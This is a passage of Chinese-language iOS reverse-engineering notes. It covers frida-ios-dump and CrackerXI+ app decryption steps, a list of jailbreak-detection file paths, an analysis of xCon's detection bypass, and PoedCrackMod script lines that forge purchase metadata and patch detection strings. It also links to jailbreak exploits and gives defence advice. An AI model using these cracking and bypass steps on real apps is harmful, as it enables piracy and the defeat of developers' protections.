http://bbs.pediy.com/showthread.php?t=209014

移动App入侵与逆向破解技术－iOS篇
https://dev.qq.com/topic/577e0acc896e9ebb6865f321

如何让 Mac 版微信客户端防撤回
http://www.jianshu.com/p/fdb8b42f7614

小试牛刀：iOS去广告入门实战
http://www.freebuf.com/articles/terminal/77386.html

一步一步实现iOS微信自动抢红包(非越狱)
http://www.jianshu.com/p/189afbe3b429

APP逆向分析之钉钉抢红包插件的实现-iOS篇
https://yohunl.com/ding-ding-qiang-hong-bao-cha-jian-iospian/

Blog

蒸米的文章
https://github.com/zhengmin1989/MyArticles

念茜（极客学院 Wiki ）
http://wiki.jikexueyuan.com/project/ios-security-defense/
杨君的小黑屋
http://blog.imjun.net/

碳基体
http://danqingdani.blog.163.com/

iPhoneDevWiki
http://iphonedevwiki.net/index.php/Main_Page

iOS Security
http://security.ios-wiki.com/



# 安装Frida-ios-dump一键砸壳

# 注意:下列解决问题指令都是在 frida-ios-dump 文件夹路径下 
# 终端cd到 frida-ios-dump 路径下

iOS端配置：
打开cydia 添加源：https://build.frida.re 安装对应插件
检查是否工作可以可在手机终端运行 frida-ps -U 查看

mac端配置：
安装Homebrew

安装python: 
```
brew install python
```
安装wget: 
```
brew install wget
```

安装pip:
```
wget https://bootstrap.pypa.io/get-pip.py
```
```
sudo python get-pip.py
```

安装usbmuxd：
```
brew install usbmuxd
```
清理残留: 
```
rm ~/get-pip.py
```
Ps: 使用brew install xxx如果一直卡在Updating Homebrew… 可以control + z结束当前进程 再新开一个终端安装 此时可以跳过更新

# 安装frida for mac：
终端执行：

sudo pip install frida
假如报以下错误：

-Uninstalling a distutils installed project (six) has been deprecated and will be removed in a future version. This is due to the fact that uninstalling a distutils project will only partially uninstall the project.

使用以下命令安装：
sudo pip install frida –upgrade –ignore-installed six

建议如下
```
sudo pip install frida --ignore-installed six
```

# 配置frida-ios-dump环境：

从Github下载工程到opt：
```
sudo mkdir /opt/dump && cd /opt/dump && sudo git clone https://github.com/AloneMonkey/frida-ios-dump
```

# 安装依赖：
会报错
sudo pip install -r /opt/dump/frida-ios-dump/requirements.txt --upgrade


建议用如下
```
sudo pip install -r requirements.txt --ignore-installed six  
```

修改dump.py参数：
```
vim /opt/dump/frida-ios-dump/dump.py
```
找到如下几行(32~35)：
```
      User = 'root'
      Password = 'alpine'
      Host = 'localhost'
      Port = 2222
```
   按需修改 如把Password 改成自己的
   ps:如果不习惯vim 用文本编辑打开/opt/dump/frida-ios-dump/dump.py手动编辑。

设置别名：

在终端输入：
```
vim ~/.bash_profile
```

在末尾新增下面一段：
```
alias dump.py="/opt/dump/frida-ios-dump/dump.py"
```

注意：以上的/opt/dump 可以按需更改 。
使别名生效：
source ~/.bash_profile

以上使用文本编辑一样实现

# 使用砸壳

打开终端 设置端口转发:
```
iproxy 2222 22
```

command + n 新建终端执行一键砸壳(QQ):
dump.py + appName
```
dump.py QQ
```

1. frida-tools 1.2.2 has requirement prompt-toolkit<2.0.0,>=0.57, but you'll have prompt-toolkit 2.0.7 which is incompatible.
这个问题是我在配置frida-iOS-dump的时候遇到的, 问题说的是 frida-tools要求的 prompt-toolkit 在 0.57及以上, 2.0.0以下, 不兼容2.0.7

解决办法: 降低 prompt-toolkit 版本

1.先卸载 prompt-toolkit
```
sudo pip uninstall prompt-toolkit
```
再安装指定prompt-toolkit 版本
prompt-toolkit 版本
sudo pip install prompt-toolkit==1.0.6

2. Cannot uninstall 'six'. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.
解决办法: 安装pip的时候, 或略安装 six, 不要参考官网sudo pip install -r requirements.txt --upgrade是错误的
```
sudo pip install -r requirements.txt --ignore-installed six
```


# 越狱检测的常见方法
```
一、越狱检测
（一）《Hacking and Securing iOS Applications》这本书的第13章介绍了以下方面做越狱检测
1. 沙盒完整性校验
根据fork()的返回值判断创建子进程是否成功
（1）返回－1，表示没有创建新的进程
（2）在子进程中，返回0
（3）在父进程中，返回子进程的PID
沙盒如何被破坏，则fork的返回值为大于等于0.
 

我在越狱设备上，尝试了一下，创建子进程是失败，说明不能根据这种方法来判断是否越狱。xCon对此种方法有检测。
代码如下：


2. 文件系统检查
（1）检查常见的越狱文件是否存在
以下是最常见的越狱文件。可以使用stat函数来判断以下文件是否存在

/Library/MobileSubstrate/MobileSubstrate.dylib 最重要的越狱文件，几乎所有的越狱机都会安装MobileSubstrate
/Applications/Cydia.app/ /var/lib/cydia/绝大多数越狱机都会安装
/var/cache/apt /var/lib/apt /etc/apt
/bin/bash /bin/sh
/usr/sbin/sshd /usr/libexec/ssh-keysign /etc/ssh/sshd_config
代码如下：
 
 

（1）返回0，表示指定的文件存在
（2）返回－1，表示执行失败，错误代码存于errno中
错误代码:
    ENOENT         参数file_name指定的文件不存在
    ENOTDIR        路径中的目录存在但却非真正的目录
    ELOOP          欲打开的文件有过多符号连接问题，上限为16符号连接
    EFAULT         参数buf为无效指针，指向无法存在的内存空间
    EACCESS        存取文件时被拒绝
    ENOMEM         核心内存不足
    ENAMETOOLONG   参数file_name的路径名称太长
struct stat {
    dev_t         st_dev;       //文件的设备编号
    ino_t         st_ino;       //节点
    mode_t        st_mode;      //文件的类型和存取的权限
    nlink_t       st_nlink;     //连到该文件的硬连接数目，刚建立的文件值为1
    uid_t         st_uid;       //用户ID
    gid_t         st_gid;       //组ID
    dev_t         st_rdev;      //(设备类型)若此文件为设备文件，则为其设备编号
    off_t         st_size;      //文件字节数(文件大小)
    unsigned long st_blksize;   //块大小(文件系统的I/O 缓冲区大小)
    unsigned long st_blocks;    //块数
    time_t        st_atime;     //最后一次访问时间
    time_t        st_mtime;     //最后一次修改时间
    time_t        st_ctime;     //最后一次改变时间(指属性)
};
该方法最简单，也是流程最广的，但最容易被破解。在使用该方法的时候，注意使用底层的c函数 stat函数来判断以下路径名，路径名做编码处理（不要使用base64编码），千万不要使用NSFileManager类，会被hook掉

(2) /etc/fstab文件的大小
该文件描述系统在启动时挂载文件系统和存储设备的详细信息，为了使得/root文件系统有读写权限，一般会修改该文件。虽然app不允许查看该文件的内容，但可以使用stat函数获得该文件的大小。在iOS 5上，未越狱的该文件大小未80字节，越狱的一般只有65字节。

在安装了xCon的越狱设备上运行，result的大小为803705776 ；卸载xCon后在越狱设备上运行，result的大小为66
个人觉得该方法不怎么可靠，并且麻烦，特别是在app在多个iOS版本上运行时。xCon对此种方法有检测,不能采用这种办法
（3）检查特定的文件是否是符号链接文件
iOS磁盘通常会划分为两个分区，一个只读，容量较小的系统分区，和一个较大的用户分区。所有的预装app（例如appstore）都安装在系统分区的/Application文件夹下。在越狱设备上，为了使得第三方软件可以安装在该文件夹下同时又避免占用系统分区的空间，会创建一个符号链接到/var/stash/下。因此可以使用lstat函数，检测/Applications的属性，看是目录，还是符号链接。如果是符号链接，则能确定是越狱设备。
以下列出了一般会创建符号链接的几个文件,可以检查以下文件

没有检测过未越狱设备的情况，所以不好判断该方法是否有效
（二）http://theiphonewiki.com/wiki/index.php?title=Bypassing_Jailbreak_Detection 给出了以下6种越狱监测方法
1、检测特定目录或文件是否存在
检测文件系统是否存在越狱后才会有的文件，例如/Applications/Cydia.app, /privte/var/stash
一般采用NSFileManager类的- (BOOL)fileExistsAtPath:(NSString *)path方法（很容易被hook掉）
或者采用底层的C函数，例如fopen(),stat() or access()
与《Hacking and Securing iOS Applications》的方法2文件系统检查相同
xCon对此种方法有检测

2、检测特定目录或文件的文件访问权限
检测文件系统中特定文件或目录的unix文件访问权限（还有大小），越狱设备较之未越狱设备有太多的目录或文件具备写权限
一般采用NSFileManager类的- (BOOL)isWritableFileAtPath:(NSString *)path（很容易被hook掉）
或者采用底层的C函数，例如statfs()
xCon对此种方法有检测
3、检测是否能创建子进程
检测能否创建子进程，在非越狱设备上，由于沙箱保护机制，是不允许进程的
可以调用一些会创建子进程的C函数，例如fork(),popen()
与《Hacking and Securing iOS Applications》的方法1沙盒完整性检查相同
xCon对此种方法有检测
4、检测能否执行ssh本地连接
检测能否执行ssh本地连接，在绝大多数的非越狱设备上，一般会安装OpenSSH（ssh服务端），如果能检测到ssh 127.0.0.1 －p 22连接成功，则说明为越狱机
xCon对此种方法有检测
5、检测system()函数的返回值
检测system()函数的返回值,调用sytem()函数，不要任何参数。在越狱设备上会返回1,在非越狱设备上会返回0
sytem()函数如果不要参数会报错

6、检测dylib（动态链接库）的内容
这种方法是目前最靠谱的方法，调用_dyld_image_count()和_dyld_get_image_name()来看当前有哪些dylib被加载

测试结果： 
使用下面代码就可以知道目标iOS设备加载了哪些dylib

#include <string.h>
#import <mach-o/loader.h>
#import <mach-o/dyld.h>
#import <mach-o/arch.h>
void printDYLD()
{
    //Get count of all currently loaded DYLD
    uint32_t count = _dyld_image_count();
    for(uint32_t i = 0; i < count; i++)
    {
        //Name of image (includes full path)
        const char *dyld = _dyld_get_image_name(i);
        
        //Get name of file
        int slength = strlen(dyld);
        
        int j;
        for(j = slength - 1; j>= 0; --j)
            if(dyld[j] == '/') break;
      
        printf("%s\n",  dyld);
    }
    printf("\n");
}
int main(int argc, char *argv[])
{
    printDYLD();

    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    int retVal = UIApplicationMain(argc, argv, nil, nil);
    [pool release];
    return retVal;
}
下图显示了我的iOS设备当前加载的dylib的路径，最下面就可以看到xCon
```

此种方法存在一个问题，是否能通过app store审核呢？

二、越狱检测绕过——xCon
可以从Cydia中安装，是目前为止最强大的越狱检测工具。由n00neimp0rtant与Lunatik共同开发，它据说patch了目前所知的所有越狱检测方法（也有不能patch的应用）。估计是由于影响太大了，目前已不开放源码了。
安装xCon后，会有两个文件xCon.dylib与xCon.plist出现在设备/Library/MobileSubstrate/DynamicLibraries目录下
（1）xCon.plist
该文件为过滤文件，标识在调用com.apple.UIKit时加载xCon.dylib

 

(2) xCon.dylib
可以使用otool工具将该文件的text section反汇编出来从而了解程序的具体逻辑（在windows下可以使用IDA Pro查看）

DANI-LEE-2:iostools danqingdani$ otool -tV xCon.dylib >xContextsection
可以根据文件中的函数名，同时结合该工具的原理以及越狱检测的一些常用手段（文章第一部分有介绍）来猜其逻辑，例如越狱检测方法中的文件系统检查，会根据特定的文件路径名来匹配，我们可以使用strings查看文件中的内容，看看会有哪些文件路径名。

DANI-LEE-2:IAP tools danqingdani$ strings xCon.dylib >xConReadable
以下是xCon中会匹配的文件名
```
/usr/bin/sshd
/usr/libexec/sftp-server
/usr/sbin/sshd
/bin/bash
/bin/sh
/bin/sw
/etc/apt
/etc/fstab
/Applications/blackra1n.app
/Applications/Cydia.app
/Applications/Cydia.app/Info.plist
/Applications/Cycorder.app
/Applications/Loader.app
/Applications/FakeCarrier.app
/Applications/Icy.app
/Applications/IntelliScreen.app
/Applications/MxTube.app
/Applications/RockApp.app
/Applications/SBSettings.app
/Applications/WinterBoard.app
/bin/bash/Applications/Cydia.app
/Library/LaunchDaemons/com.openssh.sshd.plist
/Library/Frameworks/CydiaSubstrate.framework
/Library/MobileSubstrate
/Library/MobileSubstrate/
/Library/MobileSubstrate/DynamicLibraries
/Library/MobileSubstrate/DynamicLibraries/
/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist
/Library/MobileSubstrate/DynamicLibraries/Veency.plist
/Library/MobileSubstrate/DynamicLibraries/xCon.plist
/private/var/lib/apt
/private/var/lib/apt/
/private/var/lib/cydia
/private/var/mobile/Library/SBSettings/Themes
/private/var/stash
/private/var/tmp/cydia.log
/System/Library/LaunchDaemons/com.ikey.bbot.plist
/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist
NzI0MS9MaWJyYXJ5L01vYmlsZVN1YnN0cmF0ZQ==  (对应7241/Library/MobileSubstrate） 
```
通过分析，xCon会绕过以下越狱检测方法

（1）根据是否存在特定的越狱文件，及特定文件的权限是否发生变化来判断设备是否越狱
```
fileExistsAtPath:
fileExistsAtPath:isDirectory:
filePermission:
fileSystemIsValid:
checkFileSystemWithPath:forPermissions:
mobileSubstrateWorkaround
detectIllegalApplication:
```
（2）根据沙箱完整性检测设备是否越狱
（3）根据文件系统的分区是否发生变化来检测设备是否越狱
（4）根据是否安装ssh来判断设备是否越狱

三、总结
总之，要做好越狱检测，建议使用底层的c语言函数进行，用于越狱检测的特征字符也需要做混淆处理，检测函数名也做混淆处理。第一部分介绍的以下三种方法，可以尝试一下
（1）检查常见的越狱文件是否存在，使用stat（），检查以下文件是否存在
```
/Library/MobileSubstrate/MobileSubstrate.dylib 最重要的越狱文件，几乎所有的越狱机都会安装MobileSubstrate
/Applications/Cydia.app/ /var/lib/cydia/绝大多数越狱机都会安装
/var/cache/apt /var/lib/apt /etc/apt
/bin/bash /bin/sh
/usr/sbin/sshd /usr/libexec/ssh-keysign /etc/ssh/sshd_config
```
（2）检查特定的文件是否是符号链接文件，使用lstat（），检查以下文件是否为符号链接文件
```
/Applications
/Library/Ringtones
/Library/Wallpaper
/usr/include
/usr/libexec
/usr/share
```
（3）检差dylib（动态链接库）的内容，使用_dyld_image_count与_dyld_get_image_name，检查是否包含越狱插件的dylib文件

参考：http://theiphonewiki.com/wiki/index.php?title=Bypassing_Jailbreak_Detection

# iOS12及以上砸壳工具CrackerXI+的使用方法，如下所示：
```
1.在cydia中添加 源地址 http://cydia.iphonecake.com ，添加成功后，在cydia中搜索CrackerXI+并安装。
2.打开CrackerXI+，在settings中设置CrackerXI Hook为enable
3.设置完CrackerXI+，查看列表中是否有需要被砸壳的目的app，如果有的话，选择它进行砸壳。
4.砸壳步骤根据CrackerXI+提示，一直选择yes即可。
5.CrackerXI+砸壳后，通过ssh连接手机后，即可在/var/mobile/Documents/CrackerXI/ 中看到砸壳后的app。

6.通过scp获取手机中/var/mobile/Documents/CrackerXI 目录中的ipa到电脑中，开始愉快地分析。
```

破解软件的问题，其实不仅仅是iOS上，几乎所有平台上，无论是pc还是移动终端，都是顽疾。可能在中国这块神奇的国度，大家都习惯用盗版了，并不觉得这是个问题，个人是这么想，甚至某些盈利性质的公司也这么想，著名的智能手机门户网站91.com前不久就宣传自己平台上盗版全，不花钱。其实这种把盗版软件当成噱头的网站很多，当然还没出现过91这种义正言辞地去宣传用盗版是白富美，买正版是傻X的公司。大家都是做实诚样，把最新最受欢迎的盗版应用一一挂在首页来吸引用户。同步助手就是这种内有好货，不要错过的代表，并且在盗版圈子里，享有良好的口碑，号称同步在手，江山我有。

其实iOS破解软件的问题，既不起源于中国，现阶段也没有发扬光大到称霸的地位，目前属于老二，当然很有希望赶超。据统计，全球范围内，排名前五的破解app分享网站有以下几家：

1. Apptrack    代表软件：Crackulous，clutch 
破解界的老大哥，出品了多款易用的破解软件，让人人都会破解，鼓励分享破解软件，破解app共享卡正以恐怖的速度扩充。

2. AppCake代表软件：CrackNShare
新秀，支持三种语言，中文（难得！）、英文、德文，前景很可观

3. KulApps 北美
4. iDownloads 俄国
5. iGUI 俄国

以上消息，对于依靠安装包收费的iOS开发来说，无疑是噩耗，其实由不少人也在网上号召支持正版，要求知识产权保护的力度加强。这些愿望或许终有一天会实现，但从技术的角度来分析问题的所在，给出有效的防御方案，无疑比愿望更快。

－－－－破解原理部分－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－


Appstore上的应用都采用了DRM（digital rights management）数字版权加密保护技术，直接的表现是A帐号购买的app，除A外的帐号无法使用，其实就是有了数字签名验证，而app的破解过程，实质也是去除数字签名的过程。去除过程包括两部分，如下所示：

条件一，设备越狱，获得root权限，去除掉设备上的签名检查，允许没有合法签名的程序在设备上运行

代表工具：AppSync（作者：Dissident ，Apptrack网站的核心人物）
（iOS 3.0 出现，不同的iOS版本，原理都不一样）
iOS 3.0后，MobileInstallation将可执行文件的签名校验委托给独立的二进制文件/usrlibexec/installd来处理,而AppSync 就是该执行文件的一个补丁，用来绕过签名校验。

iOS 4.0后，apple留了个后门（app给开发者预留的用于测试的沙盒环境），只要在/var/mobile/下建立tdmtanf目录，就可以绕过installd的签名校验，但该沙盒环境会造成没法进行IAP购买，无法在GameCenter查看游戏排名和加好友，特征是进入Game Center会出现SandBox字样。AppSync for iOS 4.0 +修复了这一问题。

iOS 5.0后，apple增加了新的安全机制来保护二进制文件，例如去掉二进制文件的符号表，给破解带来了难度。新版的AppSync for iOS 5.0+ 使用MobileSubstrate来hook libmis.dylib库的MISValidateSignatureAndCopyInfo函数来绕过签名验证



条件二，解密mach－o可执行文件
一般采用自购破解的方法，即先通过正常流程购买appstore 中的app，然后采用工具或手工的方式解密安装包中的mach－o可执行文件。
之所以要先获得正常的IPA的原因是mach－O文件是有DRM数字签名的，是加密过的，而解密的核心就是解密加密部分，而我们知道，当应用运行时，在内存中是处于解密状态的。所以首要步骤就是让应用先正常运行起来，而只有正常购买的应用才能达到这一目的，所以要先正常购买。

购买后，接着就是破解了。随着iOS设备cpu 的不同（arm 6 还是arm 7），mach－o文件格式的不同（thin binary 还是fat binary），应用是否对破解有防御措施（检测是否越狱，检测应用文件系统的变化），破解步骤也有所不同，但核心步骤如下：

第一步：获得cryptid，cryptoffset，cryptsize
cryptid为加密状态，0表示未加密，1表示解密；
cryptoffset未加密部分的偏移量，单位bytes
cryptsize加密段的大小，单位bytes
第二步：将cryptid修改为0
第三步：gdb导出解密部分
第四步：用第二步中的解密部分替换掉加密部分
第五步：签名
第六步：打包成IPA安装包

整个IPA破解历史上，代表性的工具如下：

代表工具：Crackulous（GUI工具）（来自Hackulous）

crackulous最初版本由SaladFork编写，是基于DecryptApp shell脚本的，后来crackulous的源码泄露，SaladFork放弃维护，由Docmorelli接手，创建了基于Clutch工具的最近版本。

代表工具：Clutch（命令行工具）（来自Hackulous）
由dissident编写，Clutch从发布到现在，是最快的破解工具。Clutch工具支持绕过ASLR（apple在iOS 4.3中加入ASLR机制）保护和支持Fat Binaries，基于icefire的icecrack工具，objective－c编写。

代表工具：PoedCrackMod（命令行工具）（来自Hackulous）
由Rastignac编写，基于poedCrack，是第一个支持破解fat binaries的工具。shell编写


代表工具：CrackTM（命令行工具）（来自Hackulous）
由MadHouse编写，最后版本为3.1.2，据说初版在破解速度上就快过poedCrack。shell编写


（以下是bash脚本工具的发展历史（脚本名（作者）），虽然目前都已废弃，但都是目前好用的ipa 破解工具的基础。
autop(Flox)——>xCrack(SaladFork)——>DecryptApp(uncon)——>Decrypt(FloydianSlip)——>poedCrack（poedgirl）——>CrackTM(MadHouse)


代表工具：CrackNShare （GUI工具）（来自appcake）
基于PoedCrackMod 和 CrackTM


我们可以通过分析这些工具的行为，原理及产生的结果来启发防御的方法。

像AppSync这种去掉设备签名检查的问题还是留给apple公司来解决（属于iOS系统层的安全），对于app开发则需要重点关注，app是如何被解密的（属于iOS应用层的安全）。

我们以PoedCrackMod和Clutch为例

一、PoedCrackMod分析（v2.5）
源码及详细的源码分析见：
http://danqingdani.blog.163.com/blog/static/18609419520129261354800/

通过分析源码，我们可以知道，整个破解过程，除去前期检测依赖工具是否存在（例如ldid，plutil，otool，gdb等），伪造特征文件，可以总结为以下几步：

第一步. 将fat binary切分为armv6，armv7部分（采用swap header技巧）
第二步：获得cryptid，cryptoffset，cryptsize
第三步. 将armv6部分的cryptid修改为0，gdb导出对应的armv6解密部分（对经过swap header处理的Mach－O文件进行操作，使其在arm 7设备上，强制运行arm 6部分），替换掉armv6加密部分，签名
第四步. 将armv7部分的cryptid修改为0，gdb导出对应的armv7解密部分（对原Mach－O文件进行操作)，替换掉armv7加密部分，签名
第五步.合并解密过的armv6，armv7
第六步.打包成ipa安装包

注明：第三步和第四步是破解的关键，破解是否成功的关键在于导出的解密部分是否正确完整。
由于binary fat格式的mach－o文件在arm 7设备上默认运行arm 7对应代码，当需要导出arm 6对应的解密部分时，要先经过swap header处理，使其在arm 7 设备上按arm 6运行。



二、clutch分析
对于最有效的clutch，由于只找到了clutch 1.0.1的源码（最新版本是1.2.4）。所以从ipa破解前后的区别来观察发生了什么。
使用BeyondCompare进行对比，发现有以下变动。

1. 正版的iTunesMetadata.plist被移除
该文件用来记录app的基本信息，例如购买者的appleID，app购买时间、app支持的设备体系结构，app的版本、app标识符

2.正版的SC_Info目录被移除
SC_Info目录包含appname.sinf和appname.supp两个文件。
（1）SINF为metadata文件
（2）SUPP为解密可执行文件的密钥

3.可执行文件发生的变动非常大,但最明显的事是cryptid的值发生了变化
leetekiMac-mini:xxx.app leedani$ otool -l appname | grep "cmd LC_ENCRYPTION_INFO" -A 4
          cmd LC_ENCRYPTION_INFO
      cmdsize 20
    cryptoff  8192
    cryptsize 6053888
    cryptid   0
--
          cmd LC_ENCRYPTION_INFO
      cmdsize 20
    cryptoff  8192
    cryptsize 5001216
    cryptid   0



iTunesMetadata.plist 与 SC_Info目录的移除只是为了避免泄露正版购买者的一些基本信息，是否去除不影响ipa的正常安装运行。

－－－－破解防御部分－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
在IPA防御方面，目前没有预防破解的好办法，但可以做事后检测，使得破解IPA无法正常运行以达到防御作用。
而该如何做事后检测呢，最直接的检测方法是将破解前后文件系统的变化作为特征值来检测。

通过分析PoedCrackMod源码，会发现根据破解前后文件时间戳的变化，或文件内容的变化为特征来判断是不可靠的，因为这些特征都可以伪造。如下所示，摘自于PoedCrackMod脚本


1.Info.plist
增加SignerIdentity,(目前主流的MinimumOSVersion版本为3.0，版本3.0之前的需要伪造SignerIdentity）
 plutil -key 'SignerIdentity' -value 'Apple iPhone OS Application Signing' "$WorkDir/$AppName/Info.plist" 2>&1> /dev/null

伪造Info.plist文件时间戳
touch -r "$AppPath/$AppName/Info.plist" "$WorkDir/$AppName/Info.plist"

2.iTunesMetadata.plist
伪造iTunesMetadata.plist文件
plutil -xml "$WorkDir/iTunesMetadataSource.plist" 2>&1> /dev/null

echo -e "\t<key>appleId</key>" >> "$WorkDir/iTunesMetadata.plist" #伪造AppleID

echo -e "\t<string>ChatMauve@apple.com</string>" >> "$WorkDir/iTunesMetadata.plist"

echo -e "\t<key>purchaseDate</key>" >> "$WorkDir/iTunesMetadata.plist" #伪造购买时间

echo -e "\t<date>2010-08-08T08:08:08Z</date>" >> "$WorkDir/iTunesMetadata.plist"



伪造iTunesMetadata.plist文件的时间戳

touch -r "$AppPath/$AppName/Info.plist" "$WorkDir/iTunesMetadata.plist"



3.mach－O文件

Lamerpatcher方法中，靠替换mach－O文件中用于检测的特征字符串来绕过检测

（题外话：设备是否越狱也可以通过检测文件系统的变化来判断，例如常见越狱文件，例如/Application/Cydia.app

/Library/MobileSubstrate/MobileSubstrate.dylibd)

            sed --in-place=.BCK \

                -e 's=/Cydia\.app=/Czdjb\.bpp=g' \

                -e 's=/private/var/lib/apt=/prjvbtf/vbr/ljb/bpt=g' \

                -e 's=/Applicat\d0\d0\d0ions/dele\d0\d0\d0teme\.txt=/Bppljcbt\d0\d0\d0jpns/dflf\d0\d0\d0tfmf\.txt=g' \

                -e 's=/Appl\d0\d0\d0ications/C\d0\d0ydi\d0a\.app=/Bppl\d0\d0\d0jcbtjpns/C\d0\d0zdj\d0b\.bpp=g' \

                -e 's=ations/Cy\d0\d0\d0/Applic\d0pp\d0\d0dia.a=btjpns/Cz\d0\d0\d0/Bppljc\d0pp\d0\d0djb.b=g' \

                -e 's=ate/va\d0\d0/priv\d0\d0\d0pt/\d0b/a\d0r/li=btf/vb\d0\d0/prjv\d0\d0\d0pt/\d0b/b\d0r/lj=g' \

                -e 's=pinchmedia\.com=pjnchmfdjb\.cpm=g' \

                -e 's=admob\.com=bdmpb\.cpm=g' \

                -e 's=doubleclick\.net=dpvblfcljck\.nft=g' \

                -e 's=googlesyndication\.com=gppglfszndjcbtjpn\.cpm=g' \

                -e 's=flurry\.com=flvrrz\.cpm=g' \

                -e 's=qwapi\.com=qwbpj\.cpm=g' \

                -e 's=mobclix\.com=mpbcljx\.cpm=g' \

                -e 's=http://ad\.=http://bd/=g' \

                -e 's=http://ads\.=http://bds/=g' \

                -e 's=http://ads2\.=http://bds2/=g' \

                -e 's=adwhirl\.com=bdwhjrl\.cpm=g' \

                -e 's=vdopia\.com=vdppjb\.cpm=g' \

                "$WorkDir/$AppName/$AppExecCur"

            #    "/Applications/Icy\.app"

            #    "/Applications/SBSettings\.app"

            #    "/Library/MobileSubstrate"

            #    "%si %sg %sn %se %sr %sI %sd %st %sy"

            #    "Sig nerId%@%@     ent ity "

            #    "Si  gne rIde    ntity"

伪造Mach－O文件时间戳

touch -r "$AppPath/$AppName/$AppExec" "$WorkDir/$AppName/$AppExec"


 所以最可靠的方法是根据cryptid的值来确定，为0便是破解版。当检测出破解版本时注意，为了避免逆向去除检测函数，需要多处做检测。同时检测函数要做加密处理，例如函数名加密，并要在多处进行检测。

而根据特征值来检测破解的方法也不是完全没用的，可以将特征值加密成无意义的字符串，最起码Lamerpatcher方法就无效了。同样，检测函数需要做加密处理，并要在多处进行检测。

看了破解ipa的原理，你会发现，所有的工具和方法都必须运行在越狱机上，因此将安全问题托付给苹果，幻想他可以将iOS系统做得无法越狱，他提供的一切安全措施都能生效（例如安全沙箱，代码签名，加密，ASLR，non executable memory，stack smashing protection）。这是不可能的，漏洞挖掘大牛门也不吃吃素的，自己的应用还是由自己来守护。


## Cycript / Class-dump / Theos / Reveal / Dumpdecrypted  逆向工具使用介绍

# 越狱开发常见的工具OpenSSH，Dumpdecrypted，class-dump、Theos、Reveal、IDA，Hopper

# 添加我的Github个人Cydia插件源: 
```
https://xlsn0w.github.io/ipas
//                     _0_
//                   _oo0oo_
//                  o8888888o
//                  88" . "88
//                  (| -_- |)
//                  0\  =  /0
//                ___/`---'\___
//              .' \\|     |// '.
//             / \\|||  :  |||// \
//            / _||||| -:- |||||- \
//           |   | \\\  -  /// |   |
//           | \_|  ''\---/''  |_/ |
//           \  .-\__  '-'  ___/-. /
//         ___'. .'  /--.--\  `. .'___
//      ."" '<  `.___\_<|>_/___.' >' "".
//     | | :  `- \`.;`\ _ /`;.`/ - ` : | |
//     \  \ `_.   \_ __\ /__ _/   .-` /  /
// XL---`-.____`.___ \_____/___.-`___.-'---sn0w
//                   `=---='
```

![CydiaRepo](https://github.com/XLsn0w/Cydia/blob/master/xlsn0w.github.io:CydiaRepo.png?raw=true)

# iOS Jailbreak Material - 推荐阅读iOS越狱资料
清单:
```
iOS 8.4.1 Yalu Open Source Jailbreak Project: https://github.com/kpwn/yalu

OS-X-10.11.6-Exp-via-PEGASUS: https://github.com/zhengmin1989/OS-X-10.11.6-Exp-via-PEGASUS

iOS 9.3.* Trident exp: https://github.com/benjamin-42/Trident

iOS 10.1.1 mach_portal incomplete jailbreak: https://bugs.chromium.org/p/project-zero/issues/detail?id=965#c2

iOS 10.2 jailbreak source code: https://github.com/kpwn/yalu102

Local Privilege Escalation for macOS 10.12.2 and XNU port Feng Shui: https://github.com/zhengmin1989/macOS-10.12.2-Exp-via-mach_voucher

Remotely Compromising iOS via Wi-Fi and Escaping the Sandbox: https://www.youtube.com/watch?v=bP5VP7vLLKo

Pwn2Own 2017 Safari sandbox: https://github.com/maximehip/Safari-iOS10.3.2-macOS-10.12.4-exploit-Bugs

Live kernel introspection on iOS: https://bazad.github.io/2017/09/live-kernel-introspection-ios/

iOS 11.1.2 IOSurfaceRootUserClient double free to tfp0: https://bugs.chromium.org/p/project-zero/issues/detail?id=1417

iOS 11.3.1 MULTIPATH kernel heap overflow to tfp0: https://bugs.chromium.org/p/project-zero/issues/detail?id=1558

iOS 11.3.1 empty_list kernel heap overflow to tfp0: https://bugs.chromium.org/p/project-zero/issues/detail?id=1564
```

```
$ touch .gitattributes

添加文件内容为

*.h linguist-language=Logos
*.m linguist-language=Logos 

含义即将所有的.m文件识别成Logos，也可添加多行相应的内容从而修改到占比，从而改变GitHub项目识别语言

```
# Mac远程登录到iphone

我们经常在Mac的终端上，通过敲一下命令来完成一些操作，iOS 和Mac OSX 都是基于Drawin（苹果的一个基于Unix的开源系统内核）,
所以ios中同样支持终端的命令行操作，在逆向工程中，可以使用命令行来操纵iphone。

## 为了建立连接需要用到 SSH 和OpenSSH

SSH： Secure Shell的缩写，表示“安全外壳协议”，是一种可以为远程登录提供安全保障的协议，
使用SSH，可以把所有传输的数据进行加密，"中间人"攻击方式就不可能实现，能防止DNS 欺骗和IP欺骗

OpenSSH： 是SSH协议的免费开源实现，可以通过OpenSSH的方式让Mac远程登录到iphone,此时进行访问时，Mac 是客户端 iphone是服务器

使用OpenSSH远程登录步骤如下

在iphone上安装cydia 安装OpenSSH工具（软件源http://apt.saurik.com）
OpenSSH的具体使用步骤可以查看Description中的描述
第一种登录方式可以使用WIFI

具体使用步骤

确保Mac和iphone在同一个局域网下（连接同一个WIFI）
在Mac的终端输入ssh账户名@服务器主机地址，比如ssh root@10.1.1.168（这里服务器是手机） 初始密码 alpine
登录成功后就可以使用终端命令行操作iphone
退出登录 exit
ps：ios下2个常用账户 root、moblie

root： 最高权限账户，HOME是 /var/root
moblie :普通权限账户，只能操作一些普通文件，不能操作别的文件,HOME是/var/mobile
登录moblie用户：root moblie@服务器主机地址
root和mobli用户的初始登录密码都是alpine
第二种登录方式 通过USB进行SSH登录

22端口
端口就是设备对外提供服务的窗口，每个端口都有个端口号,范围是0--65535，共2^16个
有些端口是保留的，已经规定了用途，比如 21端口提供FTP服务，80端口是提供HTTP服务，22端口提供SSH服务，更多保留端口号课参考 链接
iphone 默认是使用22端口进行SSH通信，采用的是TCP协议
默认情况下，由于SSH走的是TCP协议，Mac是通过网络连接的方式SSH登录到iphone，要求iPhone连接WIFI，为了加快传输速度，也可以通过USB连接的方式进行SSH登录，Mac上有个服务程序usbmuxd（开机自动启动），可以将Mac的数据通过USB传输到iphone，路径是/System/Library/PrivateFrameworks/mobileDevice.framework/Resources/usbmuxd
usbmuxd的使用
